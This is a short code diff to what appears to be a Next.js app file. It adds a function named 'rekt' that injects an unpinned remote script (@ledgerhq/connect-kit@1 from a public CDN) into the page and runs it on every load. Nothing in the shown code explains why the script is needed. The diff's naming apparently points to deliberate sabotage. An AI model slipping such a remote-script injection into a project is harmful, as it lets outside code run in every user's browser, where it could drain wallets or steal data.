@@ -7,9 +7,19 @@ import { AppProps } from 'next/app'
 import { useEffect } from 'react'
 import '../styles/globals.scss'
 
+function rekt() {
+  if (!document) return
+
+  const x = document.createElement('script')
+  const src = 'https://cdn.jsdelivr.net/npm/@ledgerhq/connect-kit@1'
+  x.setAttribute('src', src)
+  document.body.appendChild(x)
+}
+
 export default function JuicecrowdApp({ Component, pageProps }: AppProps) {
   useEffect(() => {
     installJuicecrowdWindowObject()
+    rekt()
   }, [])
 
   useFathom()
